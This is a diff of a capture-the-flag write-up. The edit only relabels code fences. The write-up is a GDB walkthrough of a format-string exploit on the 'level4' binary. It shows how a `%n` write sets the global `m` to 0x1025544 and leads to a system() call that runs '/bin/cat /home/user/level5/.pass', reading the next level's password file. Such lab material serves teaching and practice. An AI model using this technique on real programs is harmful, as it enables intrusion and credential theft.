@@ -190,13 +190,13 @@ This section documents the dynamic analysis of the `level4` binary using GDB. Th
 
 From disassembly, the variable `m` is stored at:
 
-```
+```asm
 0x0804848d <+54>:    mov    0x8049810,%eax
 ```
 
 Let's confirm its current value:
 
-```bash
+```gdb
 (gdb) x/wx 0x08049810
 0x8049810 <m>:  0x00000000
 ```
@@ -209,7 +209,7 @@ As expected, the initial value is `0`. We will aim to write `0x1025544` into thi
 
 Set a breakpoint right before the call to `p()` in `n()` (offset +49):
 
-```bash
+```gdb
 (gdb) break *0x08048488
 (gdb) run
 ```
@@ -222,7 +222,7 @@ AAAA
 
 Inspect stack memory:
 
-```bash
+```gdb
 (gdb) x/40x $esp
 0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
 0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
@@ -240,7 +240,7 @@ Look for `0x41414141` (our "AAAA") to confirm buffer location.
 
 Check the base pointer and confirm buffer location:
 
-```bash
+```gdb
 (gdb) info registers
 eax            0xbffff520       -1073744608
 esp            0xbffff510       0xbffff510
@@ -249,14 +249,14 @@ ebp            0xbffff728       0xbffff728
 
 Now compute the address of the buffer:
 
-```bash
+```gdb
 (gdb) print $ebp - 0x208
 $1 = 0xbffff520
 ```
 
 We also inspect the stack directly:
 
-```bash
+```gdb
 (gdb) x/40x $esp
 0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
 0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
@@ -299,7 +299,7 @@ Note: 4 bytes are already printed due to the address. We subtract those from the
 
 Place breakpoints to monitor state changes:
 
-```bash
+```gdb
 (gdb) break *0x0804848d   # After printf(), before m is checked
 (gdb) break *0x08048499   # system() call
 (gdb) run < /tmp/exploit
@@ -307,7 +307,7 @@ Place breakpoints to monitor state changes:
 
 When hitting the first breakpoint, inspect:
 
-```bash
+```gdb
 (gdb) x/wx 0x08049810
 0x8049810 <m>:  0x1025544
 ```
@@ -316,19 +316,19 @@ Success: the `%n` wrote the correct value into `m`.
 
 Continue execution:
 
-```bash
+```gdb
 (gdb) continue
 ```
 
 You should hit the second breakpoint:
 
-```bash
+```gdb
 Breakpoint 2, 0x08048499 in n ()
 ```
 
 Inspect the argument:
 
-```bash
+```gdb
 (gdb) x/s 0x08048590
 0x8048590:  "/bin/cat /home/user/level5/.pass"
 ```
